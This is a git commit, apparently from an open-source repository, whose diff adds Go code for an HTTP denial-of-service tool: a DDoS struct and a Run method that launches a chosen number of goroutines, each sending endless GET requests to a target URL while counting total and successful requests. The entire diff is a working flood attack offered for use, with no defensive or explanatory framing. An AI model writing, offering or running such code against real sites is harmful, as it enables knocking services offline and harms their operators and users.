564ddbc38c0a2a51b9f4c17c0254b1baf5662236
krishpranav <krisna.pranav@gmail.com>
2021-04-19 12:51:21 +0530

    added function for running ddos attack

--- ddos.go
+++ ddos.go
@@ -9,3 +9,58 @@ import (
 	"runtime"
 	"sync/atomic"
 )
+
+// ddos structure
+type DDoS struct {
+	url           string
+	stop          *chan bool
+	amountWorkers int
+
+	// Statistic
+	successRequest int64
+	amountRequests int64
+}
+
+// New - initialization of new DDoS attack
+func New(URL string, workers int) (*DDoS, error) {
+	if workers < 1 {
+		return nil, fmt.Errorf("Amount of workers cannot be less 1")
+	}
+	u, err := url.Parse(URL)
+	if err != nil || len(u.Host) == 0 {
+		return nil, fmt.Errorf("Undefined host or error = %v", err)
+	}
+	s := make(chan bool)
+	return &DDoS{
+		url:           URL,
+		stop:          &s,
+		amountWorkers: workers,
+	}, nil
+}
+
+// Run - run DDoS attack
+func (d *DDoS) Run() {
+	for i := 0; i < d.amountWorkers; i++ {
+		go func() {
+			for {
+				select {
+				case <-(*d.stop):
+					return
+				default:
+					// sent http GET requests
+					resp, err := http.Get(d.url)
+					atomic.AddInt64(&d.amountRequests, 1)
+					if err == nil {
+						atomic.AddInt64(&d.successRequest, 1)
+						_, _ = io.Copy(ioutil.Discard, resp.Body)
+						_ = resp.Body.Close()
+					}
+				}
+				runtime.Gosched()
+			}
+		}()
+	}
+}
+
+
+
